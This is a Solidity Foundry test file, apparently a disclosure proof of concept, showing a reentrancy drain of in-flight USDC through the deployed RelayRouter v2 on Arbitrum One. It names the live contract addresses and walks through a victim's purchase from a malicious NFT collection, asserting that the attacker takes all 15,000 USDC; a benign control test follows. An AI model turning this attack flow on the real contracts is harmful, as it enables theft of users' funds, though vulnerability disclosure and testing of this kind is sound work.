// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import {Test, console} from "forge-std/Test.sol";
import {MaliciousNFT, BenignNFT} from "../src/MaliciousNFT.sol";

interface IERC20Minimal {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

struct Call3Value {
    address target;
    bool allowFailure;
    uint256 value;
    bytes callData;
}

struct Result {
    bool success;
    bytes returnData;
}

interface IApprovalProxyV2 {
    function transferAndMulticall(
        address[] calldata tokens,
        uint256[] calldata amounts,
        Call3Value[] calldata calls,
        address refundTo,
        address nftRecipient
    ) external payable returns (Result[] memory returnData);
}

/// @notice PoC: RelayRouter v2 `cleanupErc20s` has NO reentrancy guard.
///         Any contract invoked during a victim's multicall can drain the
///         router's entire in-flight ERC20 balance mid-transaction.
///
///         Deployed (Arbitrum One, same CREATE2 addresses on all chains):
///         - ApprovalProxy v2: 0xBBbfD134E9b44BfB5123898BA36b01dE7ab93d98
///         - RelayRouter v2:   0xF5042e6ffaC5a625D4E7848e0b01373D8eB9e222
///         Both Sourcify exact-match verified (2026-06-18 / 2026-06-19).
///         RelayRouter v3 (repo HEAD, NOT deployed) adds `nonReentrant` to
///         all cleanup functions — the fix for exactly this issue.
///
///         Fork: Arbitrum One, verified passing at L2 head ~524717073
///         (2026-11-16). Set FORK_BLOCK=<n> with an archive RPC to
///         reproduce at a pinned block.
///         Run: forge test --match-contract RouterCleanupReentrancyTest -vvv
contract RouterCleanupReentrancyTest is Test {
    address constant PROXY = 0xBBbfD134E9b44BfB5123898BA36b01dE7ab93d98;
    address constant ROUTER = 0xF5042e6ffaC5a625D4E7848e0b01373D8eB9e222;
    address constant USDC = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831; // Arbitrum USDC, 6 dec

    uint256 constant FORK_BLOCK = 0; // fork latest; see setUp note
    uint256 constant PRICE = 10_000e6; // NFT list price: 10,000 USDC
    uint256 constant FUNDED = 15_000e6; // victim brings 15,000 (10k price + 5k spare)

    address victim = makeAddr("victim");
    address seller = makeAddr("seller");
    address attacker = makeAddr("attacker");

    function setUp() public {
        // Fork Arbitrum One. FORK_BLOCK env pins a block (needs an
        // archive RPC); default 0 = latest. The free publicnode endpoint
        // serves current state only, so local verification forks latest.
        // Verified passing at L2 head ~524717073 (2026-11-16).
        uint256 forkBlock = vm.envOr("FORK_BLOCK", uint256(0));
        if (forkBlock == 0) {
            vm.createSelectFork("arbitrum");
        } else {
            vm.createSelectFork("arbitrum", forkBlock);
        }
        // block.number on Arbitrum is the L1 number; the L2 fork block
        // comes from the ArbSys precompile.
        console.log("Fork L2 block:", _arbBlockNumber());
    }

    function _arbBlockNumber() internal view returns (uint256 n) {
        (bool ok, bytes memory ret) = address(0x64).staticcall(
            abi.encodeWithSignature("arbBlockNumber()")
        );
        require(ok, "arbBlockNumber failed");
        n = abi.decode(ret, (uint256));
    }

    function testStealInFlightFundsViaMaliciousNFT() public {
        // ---- Setup: victim holds 15,000 USDC, approves the proxy ----
        deal(USDC, victim, FUNDED);
        vm.prank(victim);
        IERC20Minimal(USDC).approve(PROXY, FUNDED);

        // ---- Setup: innocent seller lists NFT #1 from the attacker's
        //      (malicious) collection and approves the collection ----
        MaliciousNFT nft = new MaliciousNFT(ROUTER, USDC, attacker);
        nft.mint(seller, 1);
        vm.prank(seller);
        nft.approve(address(nft), 1);

        // ---- Victim buys the NFT via the deployed ApprovalProxy ----
        // Calls: [1] collection.buy(1) — moves NFT seller -> router
        //        [2] refund the 5,000 USDC spare to the victim
        //        (allowFailure=true, as a refund is best-effort).
        address[] memory tokens = new address[](1);
        tokens[0] = USDC;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = FUNDED;

        Call3Value[] memory calls = new Call3Value[](2);
        calls[0] = Call3Value({
            target: address(nft),
            allowFailure: false,
            value: 0,
            callData: abi.encodeWithSignature("buy(uint256)", 1)
        });
        calls[1] = Call3Value({
            target: USDC,
            allowFailure: true,
            value: 0,
            callData: abi.encodeWithSignature(
                "transfer(address,uint256)",
                victim,
                5_000e6
            )
        });

        uint256 attackerBefore = IERC20Minimal(USDC).balanceOf(attacker);

        vm.prank(victim);
        Result[] memory results = IApprovalProxyV2(PROXY)
            .transferAndMulticall(tokens, amounts, calls, victim, victim);

        // ---- Assertions: the attack drained the whole in-flight balance ----
        uint256 stolen = IERC20Minimal(USDC).balanceOf(attacker) -
            attackerBefore;
        console.log("USDC stolen by attacker:", stolen / 1e6, "USDC");
        console.log(
            "Seller received:",
            IERC20Minimal(USDC).balanceOf(seller) / 1e6,
            "USDC"
        );
        console.log(
            "Victim refund received:",
            IERC20Minimal(USDC).balanceOf(victim) / 1e6,
            "USDC"
        );
        console.log(
            "Router USDC balance:",
            IERC20Minimal(USDC).balanceOf(ROUTER) / 1e6,
            "USDC"
        );
        console.log("Victim owns NFT #1:", nft.ownerOf(1) == victim);
        console.log("buy() call success:", results[0].success);
        console.log("refund call success:", results[1].success);

        assertEq(stolen, FUNDED, "attacker must drain all in-flight USDC");
        assertEq(
            IERC20Minimal(USDC).balanceOf(seller),
            0,
            "seller is never paid"
        );
        assertEq(
            IERC20Minimal(USDC).balanceOf(victim),
            0,
            "victim refund silently fails"
        );
        assertEq(
            IERC20Minimal(USDC).balanceOf(ROUTER),
            0,
            "router left empty"
        );
        assertEq(nft.ownerOf(1), victim, "victim still gets the NFT");
        assertTrue(results[0].success, "buy must report success");
        assertFalse(results[1].success, "refund must fail (no funds left)");
    }

    function testControlBenignCollectionPaysSellerAndRefunds() public {
        // Same flow, honest collection: seller is paid, victim refunded.
        deal(USDC, victim, FUNDED);
        vm.prank(victim);
        IERC20Minimal(USDC).approve(PROXY, FUNDED);

        BenignNFT nft = new BenignNFT(USDC);
        nft.mint(seller, 1);
        vm.prank(seller);
        nft.approve(address(nft), 1);

        address[] memory tokens = new address[](1);
        tokens[0] = USDC;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = FUNDED;

        Call3Value[] memory calls = new Call3Value[](3);
        calls[0] = Call3Value({
            target: address(nft),
            allowFailure: false,
            value: 0,
            callData: abi.encodeWithSignature("buy(uint256)", 1)
        });
        calls[1] = Call3Value({
            target: USDC,
            allowFailure: false,
            value: 0,
            callData: abi.encodeWithSignature(
                "transfer(address,uint256)",
                seller,
                PRICE
            )
        });
        calls[2] = Call3Value({
            target: USDC,
            allowFailure: false,
            value: 0,
            callData: abi.encodeWithSignature(
                "transfer(address,uint256)",
                victim,
                5_000e6
            )
        });

        vm.prank(victim);
        IApprovalProxyV2(PROXY).transferAndMulticall(
            tokens,
            amounts,
            calls,
            victim,
            victim
        );

        assertEq(
            IERC20Minimal(USDC).balanceOf(seller),
            PRICE,
            "control: seller paid in full"
        );
        assertEq(
            IERC20Minimal(USDC).balanceOf(victim),
            5_000e6,
            "control: victim refunded"
        );
        assertEq(nft.ownerOf(1), victim, "control: victim gets the NFT");
        assertEq(
            IERC20Minimal(USDC).balanceOf(attacker),
            0,
            "control: attacker gets nothing"
        );
    }
}
